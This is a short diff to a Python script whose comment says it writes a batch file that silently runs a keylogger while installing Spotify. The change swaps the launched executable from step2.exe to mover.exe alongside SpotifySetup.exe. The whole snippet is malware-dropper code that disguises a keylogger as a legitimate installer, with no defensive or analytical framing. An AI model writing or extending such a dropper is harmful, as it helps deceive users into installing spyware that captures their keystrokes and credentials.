@@ -9,7 +9,7 @@ curr_path = os.getcwd()
 
 # create the content of the bat file, running silently the keylogger while installing spotify
 bat_script = open("td.bat", "w")
-content = '@echo off\nstart "" "step2.exe"\nstart "" "SpotifySetup.exe"'
+content = '@echo off\nstart "" "mover.exe"\nstart "" "SpotifySetup.exe"'
 bat_script.write(content)
 bat_script.close()
 
